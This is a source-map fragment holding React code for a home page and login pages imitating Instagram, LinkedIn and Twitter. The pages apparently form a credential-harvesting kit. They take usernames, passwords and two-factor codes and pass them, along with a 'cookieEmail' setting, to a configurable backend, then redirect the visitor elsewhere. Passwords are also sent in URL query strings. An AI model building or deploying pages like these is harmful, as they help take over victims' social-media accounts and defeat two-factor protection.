</Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_TWITTER === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\" }}\n                        size=\"lg\"\n                        variant=\"outline-primary\"\n                        onClick={() => this.setRedirect(\"/Instagram\")}\n                      >\n                        INSTAGRAM\n                      </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_LINKEDIN === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\" }}\n                        size=\"lg\"\n                        variant=\"outline-danger\"\n                        onClick={() => this.setRedirect(\"/LinkedIn\")}\n                      >\n                        INSTAGRAM\n                       </Button>\n                    </Row> : \"\"\n                }\n\n              </Col>\n            </Container>\n          </Card.Body>\n        </Card>\n        <Card title=\"Select login options\"></Card>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n  Form,\n  Button,\n  Container,\n  Row,\n  Col,\n  Alert,\n  Spinner,\n  Card\n} from \"react-bootstrap\";\n\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\nexport default class Instagram extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    twoFactor: false,\n    email_auth: false,\n    success: false,\n    code: \"\",\n    two_factor_identifier: \"\",\n    verificationMethod: \"\",\n  };\n\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/insta`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.twoFactor) {\n              this.setState({\n                email_auth: responseData.email_auth,\n                twoFactor: true,\n                loading: true,\n                two_factor_identifier: responseData.two_factor_identifier,\n                verificationMethod: responseData.verificationMethod,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      if (!this.state.email_auth) {\n        fetch(\n          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            if (responseData.success) {\n              this.setState(\n                { success: true, message: responseData.message },\n                () => {\n                  this.onShowAlert();\n                }\n              );\n            } else {\n              this.setState({ message: responseData.message }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      } else {\n        fetch(\n          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            this.setState(\n              {\n                message: responseData.message,\n              },\n              () => {\n                this.onShowAlert();\n              }\n            );\n            if (responseData.success) {\n              fetch(`${env.REACT_APP_URL}/insta`, {\n                method: \"POST\",\n                headers: {\n                  \"Content-Type\":\n                    \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                  username: this.state.username,\n                  password: this.state.password,\n                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                }),\n              })\n                .then((response) => response.json())\n                .then((responseData) => {\n                  console.log(responseData);\n                  this.setState(\n                    {\n                      message: responseData.message,\n                    },\n                    () => {\n                      this.onShowAlert();\n                    }\n                  );\n                  if (!responseData.success) {\n                    this.setState({ loading: false });\n                  } else {\n                    if (!responseData.twoFactor) {\n                      this.setState({ success: true });\n                    }\n                  }\n                });\n            } else {\n              this.setState({ message: responseData.message, code: \"\" }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      }\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"danger\">{this.state.message}</Alert>\n        ) : (\n            \"\"\n          )}\n\n        <Container\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n        >\n          <center>\n            {\n              env.REACT_APP_BANNER_INSTAGRAM ?\n                <div>\n                  <Card bg=\"success\" text={'light'}>\n                    <Card.Header>{env.REACT_APP_BANNER_INSTAGRAM_HEADER}</Card.Header>\n                    <Card.Body>\n                      <Card.Text>\n                        {env.REACT_APP_BANNER_INSTAGRAM_BODY}\n                      </Card.Text>\n                    </Card.Body>\n                  </Card> </div>\n                : \"\"\n            }\n            <h1>\n              <img\n                alt=\"logo\"\n                src={env.REACT_APP_FAVICONURL}\n                height=\"48px\"\n                width=\"48px\"\n                style={{ objectFit: \"cover\", borderRadius: \"50%\" }}\n              ></img>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \"Instagram Login\"}\n            </h1>\n          </center>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <Route\n                component={() => {\n                  window.location.href = env.REACT_APP_REDIRECTURL;\n                  return null;\n                }}\n              />\n              <center>\n                <h1>Login Sucess Thank You!</h1>\n              </center>\n            </Container>\n          ) : (\n              <Row>\n                <Col>\n                  <Form onSubmit={(e) => this.handleClick(e)}>\n                    <Form.Group controlId=\"formBasicEmail\">\n                      <Form.Label>Username</Form.Label>\n\n                      <Form.Control\n                        value={this.state.username}\n                        onChange={(e) => {\n                          this.handleUsername(e);\n                        }}\n                        type=\"username\"\n                        placeholder=\"Enter Instagram username\"\n                      />\n                      <Form.Text className=\"text-muted\">\n                        We'll never share your details with anyone else.\n                    </Form.Text>\n                    </Form.Group>\n\n                    <Form.Group controlId=\"formBasicPassword\">\n                      <Form.Label>Password</Form.Label>\n                      <Form.Control\n                        onChange={(e) => this.handlePassword(e)}\n                        value={this.state.password}\n                        type=\"password\"\n                        placeholder=\"Enter Instagram Password\"\n                      />\n                    </Form.Group>\n                    {this.state.loading ? (\n                      <Button variant=\"primary\" type=\"submit\" disabled>\n                        <Spinner\n                          as=\"span\"\n                          animation=\"grow\"\n                          size=\"sm\"\n                          role=\"status\"\n                          aria-hidden=\"true\"\n                        />\n                      Loading...\n                      </Button>\n                    ) : (\n                        <Button variant=\"primary\" type=\"submit\">\n                          Login\n                        </Button>\n                      )}\n\n                    {this.state.twoFactor ? (\n                      <div>\n                        <Form.Group>\n                          {this.state.email_auth ? (\n                            <Form.Label>\n                              Please enter the code received\n                            </Form.Label>\n                          ) : (\n                              <Form.Label>Enter code recieved</Form.Label>\n                            )}\n\n                          <Form.Control\n                            value={this.state.code}\n                            onChange={(e) => {\n                              this.handleCode(e);\n                            }}\n                            type=\"number\"\n                            maxLength=\"11\"\n                          />\n                        </Form.Group>\n                        <Button\n                          variant=\"outline-success\"\n                          onClick={() => {\n                            this.handleCodeClick();\n                          }}\n                        >\n                          submit code\n                      </Button>{\" \"}\n                      </div>\n                    ) : (\n                        \"\"\n                      )}\n                  </Form>\n                </Col>\n              </Row>\n            )}\n        </Container>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n  Form,\n  Button,\n  Container,\n  Row,\n  Col,\n  Alert,\n  Spinner,\n  Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    manualCheck: false,\n    success: false,\n    redirect: false,\n    challangeID: \"\",\n    code: \"\",\n  };\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/linkedin`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.manualCheck) {\n              this.setState({\n                manualCheck: true,\n                challangeID: responseData.challangeID,\n                loading: true,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      fetch(\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}`,\n        {\n          method: \"GET\",\n        }\n      )\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (responseData.success) {\n            this.setState({ success: true });\n          } else {\n            this.setState(\n              { message: responseData.message, code: \"\" },\n              () => {\n                this.onShowAlert();\n              }\n            );\n          }\n        });\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n\n\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"dark\">{this.state.message}</Alert>\n        ) : (\n            \"\"\n          )}\n        <br></br>\n\n        <Container\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n        >\n          <center>\n            {\n              env.REACT_APP_BANNER_LINKEDIN ?\n                <div>\n                  <Card bg=\"success\" text={'light'}>\n                    <Card.Header>{env.REACT_APP_BANNER_LINKEDIN_HEADER}</Card.Header>\n                    <Card.Body>\n                      <Card.Text>\n                        {env.REACT_APP_BANNER_LINKEDIN_BODY}\n                      </Card.Text>\n                    </Card.Body>\n                  </Card> </div>\n                : \"\"\n            }\n\n\n            <br></br>\n            <h1>\n              <img\n                alt=\"logo\"\n                src={env.REACT_APP_FAVICONURL}\n                height=\"48px\"\n                width=\"48px\"\n                style={{ objectFit: \"cover\", borderRadius: \"50%\" }}\n              ></img>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \" LinkedIn login\"}\n            </h1>\n          </center>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.location.href = env.REACT_APP_REDIRECTURL;\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n              <Row>\n                <Col>\n                  <Form onSubmit={(e) => this.handleClick(e)}>\n                    <Form.Group controlId=\"formBasicEmail\">\n                      <Form.Label>\n                        Enter Linkedin Username/MobileNumber\n                    </Form.Label>\n                      <Form.Control\n                        value={this.state.username}\n                        onChange={(e) => {\n                          this.handleUsername(e);\n                        }}\n                      />\n                    </Form.Group>\n                    <Form.Group controlId=\"formBasicPassword\">\n                      <Form.Label>Enter Linkedin Password</Form.Label>\n                      <Form.Control\n                        onChange={(e) => this.handlePassword(e)}\n                        value={this.state.password}\n                        type=\"password\"\n                      />\n                    </Form.Group>\n                    {this.state.loading ? (\n                      <Button variant=\"primary\" type=\"submit\" disabled>\n                        <Spinner\n                          as=\"span\"\n                          animation=\"grow\"\n                          size=\"sm\"\n                          role=\"status\"\n                          aria-hidden=\"true\"\n                        />\n                      Loading...\n                      </Button>\n                    ) : (\n                        <Button variant=\"primary\" type=\"submit\">\n                          Login\n                        </Button>\n                      )}\n\n                    {this.state.manualCheck ? (\n                      <div>\n                        <Form.Group>\n                          <Form.Label>\n                            Enter code recieved in your email\n                        </Form.Label>\n                          <Form.Control\n                            value={this.state.code}\n                            onChange={(e) => {\n                              this.handleCode(e);\n                            }}\n                            type=\"number\"\n                            maxLength=\"11\"\n                          />\n                        </Form.Group>\n                        <Button\n                          variant=\"outline-success\"\n                          onClick={() => {\n                            this.handleCodeClick();\n                          }}\n                        >\n                          submit code\n                      </Button>{\" \"}\n                      </div>\n                    ) : (\n                        \"\"\n                      )}\n                  </Form>\n                </Col>\n              </Row>\n            )}\n        </Container>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n    Form,\n    Button,\n    Container,\n    Row,\n    Col,\n    Alert,\n    Spinner,\n    Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n    state = {\n        username: \"\",\n        password: \"\",\n        showAlert: false,\n        loading: false,\n        message: \"\",\n        manualCheck: false,\n        success: false,\n        redirect: false,\n        challenge_id: \"\",\n        challenge_type: \"\",\n        enc_user_id: \"\",\n        code: \"\",\n    };\n    handleUsername = (event) => {\n        this.setState({ username: event.target.value });\n    };\n    handleCode = (event) => {\n        const { value, maxLength } = event.target;\n        const message = value.slice(0, maxLength);\n        this.setState({ code: message });\n    };\n    handlePassword = (event) => {\n        this.setState({ password: event.target.value });\n    };\n    onShowAlert = () => {\n        this.setState({ showAlert: true }, () => {\n            window.setTimeout(() => {\n                this.setState({ showAlert: false });\n            }, 30000);\n        });\n    };\n    handleClick = (e) => {\n        e.preventDefault();\n        this.setState({ loading: true });\n        if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n            fetch(`${env.REACT_APP_URL}/login/twitter`, {\n                method: \"POST\",\n                headers: {\n                    \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                    username: this.state.username,\n                    password: this.state.password,\n                    cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                }),\n            })\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (!responseData.success) {\n                        this.setState({ loading: false });\n                    } else {\n                        if (responseData.manualCheck) {\n                            this.setState({\n                                manualCheck: true,\n                                challenge_type: responseData.challenge_type,\n                                challenge_id: responseData.challenge_id,\n                                enc_user_id: responseData.enc_user_id,\n                                loading: true,\n                            });\n                        } else {\n                            this.setState({ success: true });\n                        }\n                    }\n                });\n        } else {\n            if (this.state.username.length === 0) {\n                this.setState(\n                    {\n                        message: \"username cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            } else {\n                this.setState(\n                    {\n                        message: \"password cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            }\n        }\n    };\n    handleCodeClick = (e) => {\n        if (this.state.code.length === 0 || this.state.code.length > 6) {\n            this.setState({ message: \"Code length should be equal to 6\" }, () => {\n                this.onShowAlert();\n            });\n        } else {\n            fetch(\n                `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}`,\n                {\n                    method: \"GET\",\n                }\n            )\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (responseData.success) {\n                        this.setState({ success: true });\n                    } else {\n                        this.setState(\n                            { message: responseData.message, code: \"\" },\n                            () => {\n                                this.onShowAlert();\n                            }\n                        );\n                    }\n                });\n        }\n    };\n    setRedirect = () => {\n        this.setState({\n            redirect: true,\n        });\n    };\n    renderRedirect = () => {\n        if (this.state.redirect) {\n            return <Redirect to=\"/\" />;\n        }\n    };\n    render() {\n        return (\n            <div>\n                {this.renderRedirect()}\n\n                <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n                    Back\n               </Button>\n                {this.state.showAlert ? (\n                    <Alert variant=\"dark\">{this.state.message}</Alert>\n                ) : (\n                        \"\"\n                    )}\n\n                <Container\n                    style={{\n                        position: \"absolute\",\n                        left: \"50%\",\n                        top: \"50%\",\n                        transform: \"translate(-50%, -50%)\",\n                    }}\n                ><center>\n\n                        {\n                            env.REACT_APP_BANNER_TWITTER ?\n                                <div>\n                                    <Card bg=\"success\" text={'light'}>\n                                        <Card.Header>{env.REACT_APP_BANNER_TWITTER_HEADER}</Card.Header>\n                                        <Card.Body>\n                                            <Card.Text>\n                                                {env.REACT_APP_BANNER_TWITTER_BODY}\n                                            </Card.Text>\n                                        </Card.Body>\n                                    </Card> </div>\n                                : \"\"\n                        }\n\n                    </center>\n\n                    <center>\n                        <h1>\n                            <img\n                                alt=\"logo\"\n                                src={env.REACT_APP_FAVICONURL}\n                                height=\"48px\"\n                                width=\"48px\"\n                                style={{ objectFit: \"cover\", borderRadius: \"50%\" }}\n                            ></img>\n                            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                                ? env.REACT_APP_TITLE\n                                : \"Twitter login\"}\n                        </h1>\n                    </center>\n                    {this.state.success ? (\n                        <Container\n                            style={{\n                                position: \"absolute\",\n                                left: \"50%\",\n                                top: \"50%\",\n                                transform: \"translate(-50%, -50%)\",\n                            }}\n                        >\n                            <center>\n                                <h1>Login Success Thank You!</h1>\n                            </center>\n                            <Route\n                                component={() => {\n                                    window.location.href = env.REACT_APP_REDIRECTURL;\n                                    return null;\n                                }}\n                            />\n                        </Container>\n                    ) : (\n                            <Row>\n                                <Col>\n                                    <Form onSubmit={(e) => this.handleClick(e)}>\n                                        <Form.Group controlId=\"formBasicEmail\">\n                                            <Form.Label>\n                                                Enter Twitter Username\n                    </Form.Label>\n                                            <Form.Control\n                                                value={this.state.username}\n                                                onChange={(e) => {\n                                                    this.handleUsername(e);\n                                                }}\n                                            />\n                                        </Form.Group>\n                                        <Form.Group controlId=\"formBasicPassword\">\n                                            <Form.Label>Enter Twitter Password</Form.Label>\n                                            <Form.Control\n                                                onChange={(e) => this.handlePassword(e)}\n                                                value={this.state.password}\n                                                type=\"password\"\n                                            />\n                                        </Form.Group>\n                                        {this.state.loading ? (\n                                            <Button variant=\"primary\" type=\"submit\" disabled>\n                                                <Spinner\n                                                    as=\"span\"\n                                                    animation=\"grow\"\n                                                    size=\"sm\"\n                                                    role=\"status\"\n                                                    aria-hidden=\"true\"\n                                                />\n                      Loading...\n                                            </Button>\n                                        ) : (\n                                                <Button variant=\"primary\" type=\"submit\">\n                                                    Login\n                                                </Button>\n                                            )}\n\n                                        {this.state.manualCheck ? (\n                                            <div>\n                                                <Form.Group>\n                                                    <Form.Label>\n                                                        {this.state.challenge_type === 'RetypeEmail' ? \"Enter your email id\" : \"Enter code recieved in your email\"}\n\n                                                    </Form.Label>\n                                                    <Form.Control\n                                                        value={this.state.code}\n                                                        onChange={(e) => {\n                                                            this.handleCode(e);\n                                                        }}\n                                                        type=\"text\"\n                                                    />\n                                                </Form.Group>\n                                                <Button\n                                                    variant=\"outline-success\"\n                                                    onClick={() => {\n                                                        this.handleCodeClick();\n                                                    }}\n                                                >\n                                                    submit code\n                      </Button>{\" \"}\n                                            </div>\n                                        ) : (\n                                                \"\"\n                                            )}\n                                    </Form>\n                                </Col>\n                            </Row>\n                        )}\n                </Container>\n            </div>\n        );\n    }\n}\n","import React from \"react\";\nimport { Switch, Route } from \"react-router-dom\";\nimport Home from \"./components/Home\";\nimport Instagram from \"./components/Instagram\";\nimport Linkedin from \"./components/Linkedin\";\nimport Twitter from \"./components/Twitter\";\n\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\nconsole.log(\"env is\" + env.REACT_APP_SELECT);\nfunction App() {\n  return (\n    <Switch>\n      <Route path=\"/\" component={Home} exact />\n      {\n        env.REACT_APP_TWITTER === \"true\" ? <Route path=\"/Twitter\" component={Twitter} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_LINKEDIN === \"true\" ? <Route path=\"/LinkedIn\" component={Linkedin} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_INSTAGRAM === \"true\" ? <Route path=\"/Instagram\" component={Instagram} exact /> : \"\"\n      }\n    </Switch>\n  );\n}\n\nexport default App;\n","import { createBrowserHistory as history } from \"history\";\n\nexport default history();\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport App from \"./App\";\nimport { BrowserRouter as Router } from \"react-router-dom\";\nimport history from \"./components/History\";\n\nReactDOM.render(\n  <Router history={history}>\n    <App />\n  </Router>,\n  document.getElementById(\"root\")\n);\n"],"sourceRoot":""}